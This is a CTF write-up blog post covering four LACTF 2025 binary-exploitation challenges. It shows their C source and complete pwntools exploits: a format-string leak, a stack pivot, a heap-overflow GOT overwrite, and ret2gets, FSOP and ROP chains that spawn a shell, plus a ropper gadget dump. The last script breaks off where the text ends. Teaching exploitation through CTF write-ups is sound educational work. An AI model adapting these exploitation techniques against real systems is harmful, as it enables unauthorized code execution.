---
title: "LACTF-2025"
date: 2024-10-02 00:00:00 +0800
categories: [pwn]
tags: [pwn,pivot,ret2gets,heap-overflow]
author: "kuvee"
layout: post
toc: true 
---

in this competition , i completed four chall . In the **Minecraft** chall , i also learned a lot about the ret2gets technique  

dowload file : [here](/assets/files/LACTF-2025.zip)
![score](assets/images/score.png)

##  2password



- this is warm-up chall , we will be entered 3 times , open the flag.txt  and read it into the stack

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void readline(char *buf, size_t size, FILE *file) {
  if (!fgets(buf, size, file)) {
    puts("wtf");
    exit(1);
  }
  char *end = strchr(buf, '\n');
  if (end) {
    *end = '\0';
  }
}

int main(void) {
  setbuf(stdout, NULL);
  printf("Enter username: ");
  char username[42];
  readline(username, sizeof username, stdin);
  printf("Enter password1: ");
  char password1[42];
  readline(password1, sizeof password1, stdin);
  printf("Enter password2: ");
  char password2[42];
  readline(password2, sizeof password2, stdin);
  FILE *flag_file = fopen("flag.txt", "r");
  if (!flag_file) {
    puts("can't open flag");
    exit(1);
  }
  char flag[42];
  readline(flag, sizeof flag, flag_file);
  if (strcmp(username, "kaiphait") == 0 &&
      strcmp(password1, "correct horse battery staple") == 0 &&
      strcmp(password2, flag) == 0) {
    puts("Access granted");
  } else {
    printf("Incorrect password for user ");
    printf(username);
    printf("\n");
  }
}
```

- Next is to use strcmp to check our input, but it doesn't do anything, we need attention to the code below

```c
printf(username)
```

Ill use this code to find the offset to the flag

```python
def generate(start: int, end: int, specifier: str = "p", seperator: str = "."):
    """ Generate a simple payload """
    payload = b""
    for i in range(start, end):
        payload += f"%{i}${specifier}{seperator}".encode()
    return payload
```

'}' in hex byte is 0x7d : 

![fsb](assets/images/fsb.png)


script 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched",checksec=False)
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process()
p = remote('chall.lac.tf', 31142)

def generate(start: int, end: int, specifier: str = "p", seperator: str = "."):
    """ Generate a simple payload """
    payload = b""
    for i in range(start, end):
        payload += f"%{i}${specifier}{seperator}".encode()
    return payload

def fix(payload: bytes, seperator: str = "."):
    """ Unhex the payload and return as a string """
    rt = b""
    for i in payload.split(b'.')[:-1]: # the last one is empty
        i = i[2:] # removing the 0x
        if i[0] == 97: # remove the newline
            i = i[1:]
        rt += unhex(i)[::-1] # unhex and rev
    return rt

pl = generate(6,9)
p.sendlineafter(b'username: ',pl)

p.sendlineafter(b'password1: ',b'kuvee')
p.sendlineafter(b'password2: ',b'kuvee@@zzzzz')

p.recvuntil(b'Incorrect password for user ')
leak = p.recvline()
print(fix(leak))

p.interactive()
```

![flag](/assets/images/flag.png)

## state-change

- code is very short, we can reverse it easy , In the vuln() function there is a bug **bof** and win() func to get flag , but in **win** check **state** with **0xf1eeee2d** , we need to satisfy this condition to get flag

```c
#include <stdio.h>
#include <string.h>

char buf[0x500]; // Wow so useful
int state;
char errorMsg[0x70];

void win() {
    char filebuf[64];
    strcpy(filebuf, "./flag.txt");
    FILE* flagfile = fopen("flag.txt", "r");

    /* ********** ********** */
    // Note this condition in win()
    if(state != 0xf1eeee2d) {
        puts("\ntoo ded to gib you the flag");
        exit(1);
    }
    /* ********** ********** */
    
    if (flagfile == NULL) {
        puts(errorMsg);
    } else {
        char buf[256];
        fgets(buf, 256, flagfile);
        buf[strcspn(buf, "\n")] = '\0';
        puts("Here's the flag: ");
        puts(buf);
    }
}

void vuln(){
    char local_buf[0x20];
    puts("Hey there, I'm deaddead. Who are you?");
    fgets(local_buf, 0x30, stdin);
}

int main(){

    state = 0xdeaddead;
    strcpy(errorMsg, "Couldn't read flag file. Either create a test flag.txt locally and try connecting to the server to run instead.");

    setbuf(stdin, 0);
	setbuf(stdout, 0);

    vuln();
    
    return 0;
}
```

- i used **pivot** to change value of stage and return to **win** function to get flag

exp

```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./chall')

#p = process()
p = remote('chall.lac.tf', 31593)

stage = 0x0000000000404540
offset = 32
gets = 0x00000000004012D0
pl = b'a'*32 + p64(stage+0x10) + p64(gets)
input()
p.sendafter(b'Who are you?',pl)

pl2 = b'b'*15 + p64(0xF1EEEE2D) + b'a'*16 + p64(exe.sym.win)
input()
p.sendline(pl2)


p.interactive()
```

![flag2](/assets/images/flag2.png)

## gamedev 

- The chall has many option , we'll go through each option

we have leak exe_address at main() func

```c
#include <stdio.h>
#include <stdlib.h>

struct Level *start = NULL;
struct Level *prev = NULL;
struct Level *curr = NULL;

struct Level
{
    struct Level *next[8];
    char data[0x20];
};

int get_num()
{
    char buf[0x10];
    fgets(buf, 0x10, stdin);
    return atoi(buf);
}

void create_level()
{
    if (prev == curr) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }

    printf("Enter level index: ");
    int idx = get_num();

    if (idx < 0 || idx > 7) {
        puts("Invalid index.");
        return;
    }
    
    struct Level *level = malloc(sizeof(struct Level));
    if (level == NULL) {
        puts("Failed to allocate level.");
        return;
    }

    level->data[0] = '\0';
    for (int i = 0; i < 8; i++)
        level->next[i] = NULL;

    prev = level;

    if (start == NULL)
        start = level;
    else
        curr->next[idx] = level;
}

void edit_level()
{
    if (start == NULL || curr == NULL) {
        puts("No level to edit.");
        return;
    }

    if (curr == prev || curr == start) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }
    
    printf("Enter level data: ");
    fgets(curr->data, 0x40, stdin);
}

void test_level()
{
    if (start == NULL || curr == NULL) {
        puts("No level to test.");
        return;
    }

    if (curr == prev || curr == start) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }
    
    printf("Level data: ");
    write(1, curr->data, sizeof(curr->data));
    putchar('\n');
}

void explore()
{
    printf("Enter level index: ");
    int idx = get_num();

    if (idx < 0 || idx > 7) {
        puts("Invalid index.");
        return;
    }

    if (curr == NULL) {
        puts("No level to explore.");
        return;
    }
    
    curr = curr->next[idx];
}

void reset()
{
    curr = start;
}

void menu()
{
    puts("==================");
    puts("1. Create level");
    puts("2. Edit level");
    puts("3. Test level");
    puts("4. Explore");
    puts("5. Reset");
    puts("6. Exit");

    int choice;
    printf("Choice: ");
    choice = get_num();

    if (choice < 1 || choice > 6)
        return;
    
    switch (choice)
    {
        case 1:
            create_level();
            break;
        case 2:
            edit_level();
            break;
        case 3:
            test_level();
            break;
        case 4:
            explore();
            break;
        case 5:
            reset();
            break;
        case 6:
            exit(0);
    }
}

void init()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    // Add starting level
    start = malloc(sizeof(struct Level));
    start->data[0] = '\0';
    for (int i = 0; i < 8; i++)
        start->next[i] = NULL;
    curr = start;
}

int main()
{
    init();
    puts("Welcome to the heap-like game engine!");
    printf("A welcome gift: %p\n", main);
    while (1)
        menu();
    return 0;
}

```

- create_level() : 

Check prev_level and current level  

level ranges from 0->7

Use malloc() to initialize a new struct

Initialize the next pointer 



```c
void create_level()
{
    if (prev == curr) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }

    printf("Enter level index: ");
    int idx = get_num();

    if (idx < 0 || idx > 7) {
        puts("Invalid index.");
        return;
    }
    
    struct Level *level = malloc(sizeof(struct Level));
    if (level == NULL) {
        puts("Failed to allocate level.");
        return;
    }

    level->data[0] = '\0';
    for (int i = 0; i < 8; i++)
        level->next[i] = NULL;

    prev = level;

    if (start == NULL)
        start = level;
    else
        curr->next[idx] = level;
}
```

- edit_level() :  We will be able to input data into curr-data but it's  input 0x40 bytes?  and data only 20 bytes -> *Heap overflow*

```c
struct Level
{
    struct Level *next[8];
    char data[0x20];
};
```

```c
void edit_level()
{
    if (start == NULL || curr == NULL) {
        puts("No level to edit.");
        return;
    }

    if (curr == prev || curr == start) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }
    
    printf("Enter level data: ");
    fgets(curr->data, 0x40, stdin);
}
```

-  test_level() : it's use write to print data of **curr-data**

```c
void test_level()
{
    if (start == NULL || curr == NULL) {
        puts("No level to test.");
        return;
    }

    if (curr == prev || curr == start) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }
    
    printf("Level data: ");
    write(1, curr->data, sizeof(curr->data));
    putchar('\n');
}

```
- explore() : Assign the level of input to the curr


```c
void explore()
{
    printf("Enter level index: ");
    int idx = get_num();

    if (idx < 0 || idx > 7) {
        puts("Invalid index.");
        return;
    }

    if (curr == NULL) {
        puts("No level to explore.");
        return;
    }
    
    curr = curr->next[idx];
}
```

- reset() : resets curr to start, allowing users to restart from the first level.  

```c
void reset()
{
    curr = start;
}
```

### vuln

- here , we'v a heap_overflow , what can we do with this? We will be able to overflow the data of the next struct.

![chunk](/assets/images/chunk.png)

comeback this func ,  it assigns curr to curr->next[idx]. But what if we do this?

explore(0) -> explore(1) -> explore(1)

The third call to explore() will allow us to read and write arbitrary data when combined with the edit() function.

```c
void explore()
{
    
    curr = curr->next[idx];
}
```

- it will look like this : 

```cs
0x557bb9e8a290  0x0000000000000000      0x0000000000000071      ........q.......
0x557bb9e8a2a0  0x0000557bb9e8a310      0x0000557bb9e8a380      ....{U......{U..
0x557bb9e8a2b0  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a2c0  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a2d0  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a2e0  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a2f0  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a300  0x0000000000000000      0x0000000000000071      ........q.......
0x557bb9e8a310  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a320  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a330  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a340  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a350  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x557bb9e8a360  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x557bb9e8a370  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x557bb9e8a380  0x6161616161616161      0x0000557bb8d1dfd8      aaaaaaaa....{U..
0x557bb9e8a390  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a3a0  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a3b0  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a3c0  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a3d0  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a3e0  0x0000000000000000      0x0000000000020c21      ........!.......         <-- Top chunk
```

- explore first : it will go to the next level (lv1) : **0x557bb9e8a380**

![image1](/assets/images/test.png)

- If we add one more level, we can completely read and write arbitrarily.

![image2](/assets/images/test1.png)

- Finally, we will overwrite the GOT, and perhaps got@atoi will be the easiest target in this challenge (libc 2.36 does not allow hooks).

exp : 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()

p.recvuntil(b'gift: ')
exe.address = int(p.recvline()[:-1],16) - 0x1662
log.info(f'exe: {hex(exe.address)}')

def create_level(idx):
    p.sendlineafter(b'Choice: ',b'1')
    p.sendlineafter(b'index: ',f'{idx}'.encode())

def edit(data):
    p.sendlineafter(b'Choice: ',b'2')
    p.sendlineafter(b'data: ',data)

def test_level():
    p.sendlineafter(b'Choice: ',b'3')

def expore(idx):
    p.sendlineafter(b'Choice: ',b'4')
    p.sendlineafter(b'index: ',f'{idx}'.encode())

def reset():
    p.sendlineafter(b'Choice: ',b'5')

# leak libc
input()
create_level(0)
create_level(1)

expore(0)
edit(b'a'*0x38 + p64(exe.got.printf-0x40))

reset()
expore(1)
expore(1)

test_level()

p.recvuntil(b'Level data: ')
libc.address = u64(p.recv(6).ljust(8,b'\x00')) - libc.sym.printf
log.info(f'libc: {hex(libc.address)}')

reset()

# write got

create_level(0)
create_level(1)
expore(0)
edit(b'a'*0x38 + p64(exe.got.atoi-0x40))

reset()

expore(1)
expore(1)

edit(p64(libc.sym.system))

p.sendlineafter(b'Choice: ',b'/bin/sh\x00')


p.interactive()
```

![flag3](/assets/images/flag3.png)

## minceraft

- This is a very interesting challenge related to a technique I recently learned (ret2gets). It is based on complex principles, and you can read about it here [ret2gets](https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets)

- We only need attention to **gets** , which give us a very obvious BOF , but libc version in this chall is 2.36 , the **libc_csu_init** function is no longer present after compilation, and useful gadgets like pop rdi are also missing

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int read_int() {
  int x;
  if (scanf(" %d", &x) != 1) {
    puts("wtf");
    exit(1);
  }
  return x;
}

int main(void) {
  setbuf(stdout, NULL);
  while (1) {
    puts("\nM I N C E R A F T\n");
    puts("1. Singleplayer");
    puts("2. Multiplayer");
    if (read_int() != 1) {
      puts("who needs friends???");
      exit(1);
    }
    puts("Creating new world");
    puts("Enter world name:");
    char world_name[64];
    scanf(" ");
    gets(world_name);
    puts("Select game mode");
    puts("1. Survival");
    puts("2. Creative");
    if (read_int() != 1) {
      puts("only noobs play creative smh");
      exit(1);
    }
    puts("Creating new world");
    sleep(1);
    puts("25%");
    sleep(1);
    puts("50%");
    sleep(1);
    puts("75%");
    sleep(1);
    puts("100%");
    puts("\nYOU DIED\n");
    puts("you got blown up by a creeper :(");
    puts("1. Return to main menu");
    puts("2. Exit");
    if (read_int() != 1) {
      return 0;
    }
  }
}
```

- we can use **ropper** to check , And obviously, there is no pop rdi, nor is there a win function in this challenge. So how can we leak libc? This is where ret2gets comes into play. When using gets, it will return a libc address in the RDI register, which corresponds to _IO_stdfile_0_lock. If printf were executed next, we would get a libc address. However, in this challenge, only the puts function is available. Still, we can bypass this limitation using the following payload:

```python
from pwn import *

e = context.binary = ELF('demo')
libc = ELF("libc")
p = e.process()

payload  = b"A" * 0x20
payload += p64(0)	# saved rbp
payload += p64(e.plt.gets)
payload += p64(e.plt.gets)
payload += p64(e.plt.puts)

p.sendlineafter(b"ROP me if you can!\n", payload)

p.sendline(p32(0) + b"A"*4 + b"B"*8)
p.sendline(b"CCCC")

p.recv(8)
tls = u64(p.recv(6) + b"\x00\x00")
log.info(f"tls: {hex(tls)}")

libc.address = tls + 0x28c0
log.info(f"libc: {hex(libc.address)}")

p.interactive()
```

- for details , u need to read the blog to understandunderstand

```cs
ploi@PhuocLoiiiii:~/pwn/LACTF-2025/minceraft$ ropper -f chall_patched
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x00000000004010a8: adc dword ptr [rax], eax; call qword ptr [rip + 0x2f27]; hlt; nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret;
0x000000000040111e: adc dword ptr [rax], edi; test rax, rax; je 0x3130; mov edi, 0x404040; jmp rax;
0x00000000004010ac: adc eax, 0x2f27; hlt; nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret;
0x00000000004010dc: adc edi, dword ptr [rax]; test rax, rax; je 0x30f0; mov edi, 0x404040; jmp rax;
0x000000000040114c: adc edx, dword ptr [rbp + 0x48]; mov ebp, esp; call 0x30d0; mov byte ptr [rip + 0x2eeb], 1; pop rbp; ret;
0x00000000004010b0: add ah, dh; nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret;
0x00000000004011b1: add al, ch; mov ecx, 0x8bfffffe; cld; leave; ret;
0x00000000004010aa: add bh, bh; adc eax, 0x2f27; hlt; nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret;
0x000000000040100a: add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x00000000004011af: add byte ptr [rax], al; add al, ch; mov ecx, 0x8bfffffe; cld; leave; ret;
0x00000000004010b8: add byte ptr [rax], al; add byte ptr [rax], al; nop dword ptr [rax]; ret;
0x00000000004010de: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x30f0; mov edi, 0x404040; jmp rax;
0x0000000000401120: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x3130; mov edi, 0x404040; jmp rax;
0x0000000000401383: add byte ptr [rax], al; add byte ptr [rax], al; leave; ret;
0x0000000000401384: add byte ptr [rax], al; add cl, cl; ret;
0x00000000004011b0: add byte ptr [rax], al; call 0x3070; mov eax, dword ptr [rbp - 4]; leave; ret;
0x00000000004010ba: add byte ptr [rax], al; nop dword ptr [rax]; ret;
0x000000000040138a: add byte ptr [rax], al; sub rsp, 8; add rsp, 8; ret;
0x0000000000401009: add byte ptr [rax], al; test rax, rax; je 0x3012; call rax;
0x0000000000401009: add byte ptr [rax], al; test rax, rax; je 0x3012; call rax; add rsp, 8; ret;
0x00000000004010e0: add byte ptr [rax], al; test rax, rax; je 0x30f0; mov edi, 0x404040; jmp rax;
0x0000000000401122: add byte ptr [rax], al; test rax, rax; je 0x3130; mov edi, 0x404040; jmp rax;
0x00000000004010af: add byte ptr [rax], al; hlt; nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret;
0x0000000000401385: add byte ptr [rax], al; leave; ret;
0x000000000040115b: add byte ptr [rcx], al; pop rbp; ret;
0x0000000000401386: add cl, cl; ret;
0x00000000004010a9: add dil, dil; adc eax, 0x2f27; hlt; nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret;
0x00000000004011ae: add dword ptr [rax], eax; add byte ptr [rax], al; call 0x3070; mov eax, dword ptr [rbp - 4]; leave; ret;
0x0000000000401006: add eax, 0x2fd5; test rax, rax; je 0x3012; call rax;
0x0000000000401006: add eax, 0x2fd5; test rax, rax; je 0x3012; call rax; add rsp, 8; ret;
0x0000000000401013: add esp, 8; ret;
0x0000000000401012: add rsp, 8; ret;
0x00000000004011a8: call 0x3030; mov edi, 1; call 0x3070; mov eax, dword ptr [rbp - 4]; leave; ret;
0x00000000004011b2: call 0x3070; mov eax, dword ptr [rbp - 4]; leave; ret;
0x0000000000401151: call 0x30d0; mov byte ptr [rip + 0x2eeb], 1; pop rbp; ret;
0x0000000000401374: call 0x3176; cmp eax, 1; je 0x31d8; mov eax, 0; leave; ret;
0x00000000004010ab: call qword ptr [rip + 0x2f27]; hlt; nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret;
0x0000000000401010: call rax;
0x0000000000401010: call rax; add rsp, 8; ret;
0x0000000000401379: cmp eax, 1; je 0x31d8; mov eax, 0; leave; ret;
0x0000000000401002: in al, dx; or byte ptr [rax - 0x75], cl; add eax, 0x2fd5; test rax, rax; je 0x3012; call rax;
0x000000000040100e: je 0x3012; call rax;
0x000000000040100e: je 0x3012; call rax; add rsp, 8; ret;
0x00000000004010db: je 0x30f0; mov eax, 0; test rax, rax; je 0x30f0; mov edi, 0x404040; jmp rax;
0x00000000004010e5: je 0x30f0; mov edi, 0x404040; jmp rax;
0x000000000040111d: je 0x3130; mov eax, 0; test rax, rax; je 0x3130; mov edi, 0x404040; jmp rax;
0x0000000000401127: je 0x3130; mov edi, 0x404040; jmp rax;
0x000000000040137c: je 0x31d8; mov eax, 0; leave; ret;
0x00000000004010ec: jmp rax;
0x0000000000401156: mov byte ptr [rip + 0x2eeb], 1; pop rbp; ret;
0x00000000004010dd: mov eax, 0; test rax, rax; je 0x30f0; mov edi, 0x404040; jmp rax;
0x000000000040111f: mov eax, 0; test rax, rax; je 0x3130; mov edi, 0x404040; jmp rax;
0x0000000000401382: mov eax, 0; leave; ret;
0x00000000004011b7: mov eax, dword ptr [rbp - 4]; leave; ret;
0x0000000000401005: mov eax, dword ptr [rip + 0x2fd5]; test rax, rax; je 0x3012; call rax;
0x0000000000401005: mov eax, dword ptr [rip + 0x2fd5]; test rax, rax; je 0x3012; call rax; add rsp, 8; ret;
0x000000000040114f: mov ebp, esp; call 0x30d0; mov byte ptr [rip + 0x2eeb], 1; pop rbp; ret;
0x00000000004011b3: mov ecx, 0x8bfffffe; cld; leave; ret;
0x00000000004010a5: mov edi, 0x4011bc; call qword ptr [rip + 0x2f27]; hlt; nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret;
0x00000000004010e7: mov edi, 0x404040; jmp rax;
0x00000000004011ad: mov edi, 1; call 0x3070; mov eax, dword ptr [rbp - 4]; leave; ret;
0x00000000004010a7: mov esp, 0xff004011; adc eax, 0x2f27; hlt; nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret;
0x0000000000401004: mov rax, qword ptr [rip + 0x2fd5]; test rax, rax; je 0x3012; call rax;
0x0000000000401004: mov rax, qword ptr [rip + 0x2fd5]; test rax, rax; je 0x3012; call rax; add rsp, 8; ret;
0x000000000040114e: mov rbp, rsp; call 0x30d0; mov byte ptr [rip + 0x2eeb], 1; pop rbp; ret;
0x00000000004010a4: mov rdi, 0x4011bc; call qword ptr [rip + 0x2f27]; hlt; nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret;
0x00000000004010b4: nop dword ptr [rax + rax]; nop dword ptr [rax]; ret;
0x00000000004010bc: nop dword ptr [rax]; ret;
0x00000000004010b3: nop dword ptr cs:[rax + rax]; nop dword ptr [rax]; ret;
0x00000000004010b2: nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret;
0x0000000000401003: or byte ptr [rax - 0x75], cl; add eax, 0x2fd5; test rax, rax; je 0x3012; call rax;
0x00000000004010e6: or dword ptr [rdi + 0x404040], edi; jmp rax;
0x000000000040115d: pop rbp; ret;
0x000000000040114d: push rbp; mov rbp, rsp; call 0x30d0; mov byte ptr [rip + 0x2eeb], 1; pop rbp; ret;
0x0000000000401042: ret 0x2f;
0x000000000040100d: sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x000000000040138d: sub esp, 8; add rsp, 8; ret;
0x0000000000401001: sub esp, 8; mov rax, qword ptr [rip + 0x2fd5]; test rax, rax; je 0x3012; call rax;
0x000000000040138c: sub rsp, 8; add rsp, 8; ret;
0x0000000000401000: sub rsp, 8; mov rax, qword ptr [rip + 0x2fd5]; test rax, rax; je 0x3012; call rax;
0x00000000004010b6: test byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; nop dword ptr [rax]; ret;
0x000000000040100c: test eax, eax; je 0x3012; call rax;
0x000000000040100c: test eax, eax; je 0x3012; call rax; add rsp, 8; ret;
0x00000000004010e3: test eax, eax; je 0x30f0; mov edi, 0x404040; jmp rax;
0x0000000000401125: test eax, eax; je 0x3130; mov edi, 0x404040; jmp rax;
0x000000000040100b: test rax, rax; je 0x3012; call rax;
0x000000000040100b: test rax, rax; je 0x3012; call rax; add rsp, 8; ret;
0x00000000004010e2: test rax, rax; je 0x30f0; mov edi, 0x404040; jmp rax;
0x0000000000401124: test rax, rax; je 0x3130; mov edi, 0x404040; jmp rax;
0x00000000004011b9: cld; leave; ret;
0x00000000004010b1: hlt; nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret;
0x00000000004011ba: leave; ret;
0x00000000004010ef: nop; ret;
0x0000000000401016: ret;

94 gadgets found
```

- So we will use the payload to leak libc, and once we have the leak, we just need to perform ret2libc.

script 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
p = process()

def leak():
    input()
    p.sendline(b'1')

    pl = b'a'*64 + p64(0) + p64(exe.plt.gets) + p64(exe.plt.gets) + p64(exe.plt.puts) + p64(exe.sym.main)

    p.sendlineafter(b'Enter world name:',pl)

    input()
    p.sendline(b'1')
    input()
    p.sendline(b'2')
    sleep(2)
    input()
    p.sendline(b"A" * 4 + b"\x00"*3)
    p.recvuntil(b'Exit')
    p.recvline()
    p.recv(8)

    libc_leak = u64(p.recv(6).ljust(8,b'\x00'))
    libc.address = libc_leak + 0x28c0
    log.info(f'libcleak: {hex(libc_leak)}')
    log.info(f'libc: {hex(libc.address)}')
def get_shell():
    input()
    p.sendline(b'1')
    pl = b'a'*64 + p64(0) + p64(0x00000000000277e5+libc.address) + p64(next(libc.search(b'/bin/sh\x00')))
    pl += p64(0x00000000000277e5+libc.address+1) + p64(libc.sym.system)
    p.sendlineafter(b'Enter world name:',pl)
    input()
    p.sendline(b'1')
    input()
    p.sendline(b'2')

leak()
get_shell()

p.interactive()
```

- Additionally, there are many other methods (I saw on Discord) such as FSOP, pivot, and ROP being used in this challenge. I will leave the payload here for ref


FSOP : 

description (i solved minceraft by overwriting the setbuf got entry to be gets and sleep to main (to cause an infinite loop), which lets you freely edit the stdout file stream)

```python
#!/usr/bin/env python3

from pwn import *
import io_file

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
global p

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.GDB:
            gdb.attach(p,gdbscript='''
dprintf gets,"gets RDI: %p\\n",$rdi
break exit
''')
            sleep(2)
    else:
        p = remote("chall.lac.tf",31137)
    return p

def main():
    global p
    p = conn()
    
    data_section = 0x404000
    
    # loop 1: set RBP to data section (where got entries are), jump back to main
    p.sendlineafter(b'Singleplayer',b'1')
    p.sendlineafter(b'world name',b'A'*64+p64(data_section+0x18+0x30)+p64(exe.sym['main']+4))
    p.sendlineafter(b'game mode',b'1')
    p.sendlineafter(b'Exit',b'2')
    
    # now we can overwrite got entries
    p.sendlineafter(b'Singleplayer',b'1')
    p.sendlineafter(b'world name',flat(
    exe.plt.gets, # overwrite setbuf() got entry to gets()
    exe.plt.gets+6, # keep gets() as-is
    exe.plt.__isoc99_scanf+6, # keep scanf as-is
    exe.plt.exit+6, # keep exit as-is
    exe.sym['main'], # make sleep() loop back to main, forcing infinite loop
    ))
    
    # now next time setvbuf() is called we can edit stdout
    p.sendafter(b'game mode', b'1')
    # edit stdout file stream for arb read libc leak
    # https://github.com/nobodyisnobody/docs/tree/main/using.stdout.as.a.read.primitive
    p.send(p64(0xfbad1887) + p64(0)*3 + p64(data_section) + p64(data_section+100)*3 + p64(data_section+100+1))
    p.sendlineafter(b'Creating new world\n',b'1')
    leak = u64(p.recvn(8))
    info(f"{leak=:#x}")
    libc.address = leak - libc.sym['puts']
    info(f"{libc.address=:#x}")
    
    # loop program so we can edit the stream a second time
    p.sendlineafter(b'Singleplayer',b'1')
    p.sendlineafter(b'world name',b'hi')
    p.sendafter(b'game mode', b'1')
    
    # fsop w/ house of apple
    # https://github.com/corgeman/leakless_research/blob/main/part_1/io_file.py
    file = io_file.IO_FILE_plus_struct() 
    payload = file.house_of_apple2_execmd_when_do_IO_operation(
        libc.sym['_IO_2_1_stdout_'],
        libc.sym['_IO_wfile_jumps'],
        libc.sym['system'])
        
    p.send(payload)
    
    p.interactive() # PLIMB's up!
    
if __name__ == "__main__":
    main()
```


- more

```python
from pwn import *

#p = process("./minecraft_chal")
p = remote("chall.lac.tf", 31137)

p.recvuntil(b"2. Multiplayer\n")
p.send(b"1\n")

p.recvuntil(b"Enter world name:\n")
p.send(b"A"*64 +
       p64(0x404e00) + # sp
       p64(0x4011bb) + # single ret for padding
       p64(0x401176) + # scanf addr
       p64(0x401367) + # return back and return value
       b"\n")

p.recvuntil(b"2. Creative\n")
p.send(b"1\n")

p.recvuntil(b"2. Exit\n")
p.send(b"2 4210688\n") # leak libc (puts is at 0x404000)

puts_addr_bytes = p.recvuntil(b"\n")[:6] + b"\x00\x00"
puts_addr = u64(puts_addr_bytes)
print(f"puts @ {hex(puts_addr)}")
p.send(b"1\n")

# start over here

p.recvuntil(b"2. Multiplayer\n")
p.send(b"1\n")

# p.interactive()

p.recvuntil(b"Enter world name:\n")
p.send(b"A"*64 +
       p64(0x404e00) + # sp
       # remote
       p64(puts_addr + 0x9A2) + # pop rdi; ret
       p64(puts_addr + 0x11E6B1) + # /bin/sh
       p64(puts_addr + 0x9A3) + # single ret for padding
       p64(puts_addr - 0x2B4F0) + # system
       b"\n")

p.recvuntil(b"2. Creative\n")
p.send(b"1\n")

p.recvuntil(b"2. Exit\n")
p.send(b"2\n")

p.interactive()
```

- moreeee 

```python
# cp ./chall ./chall_patched
# patchelf ./chall_patched --set-interpreter ./path/to/ld/file

from pwn import *

context.clear(arch='amd64', terminal=['tmux', 'splitw', '-fh'], aslr=True)

elf = ELF('./chall_patched')
libc = ELF('./libc.so.6')

gdbscript = '''b *main+440
b *main+163
b *main+138
b exit
c
c
c
c
c
c

'''

# minecraft gadgets
nop_ret = p64(0x4010ef)
pop_rbp_ret = p64(0x40115d)
main = p64(elf.sym['main'])
read_int = p64(elf.sym['read_int'])
data_section = p64(0x404100 + 0x38)     # add 0x38 bc we will overwrite rbp later wil a writable section for one gadget

p = process('./chall_patched', env={"LD_PRELOAD" : "./libc.so.6"})
#p = gdb.debug('./chall_patched', env={"LD_PRELOAD" : "./libc.so.6"}, gdbscript=gdbscript)
#p = remote('chall.lac.tf', 31137)

payload  = b'A' * 64            # fill buffer
payload += p64(1)               # sets stack pointer to rbp to a garbage value

# 1st ropchain
payload += nop_ret              # nop ; ret to 16 byte align stack
payload += read_int             # sets rax to our input (0x404020 for exit got addr) for overwrite
payload += pop_rbp_ret          # pop rbp ; ret
payload += data_section         # push a data_section on the stack so pop rbp gadget sets rbp = exit@got to be able to write second ropchain there
payload += p64(0x401243)        # ret to puts before the gets call to print a libc leak
payload += main                 # return to main for second ropchain
payload += b'C' * 8     # for debugging

p.sendline(b'1')                        # singleplayer
p.sendline(payload)                     # this is the 1st gets call, sets ropchain
p.sendline(b'1')                        # survival
p.sendline(b'2')                        # exit = 2, restart = 1

p.clean()
p.sendline(b'4210688')  # setting rax to puts@got from read_int in ropchain to puts libc leak

p.recvuntil(b'\x80')
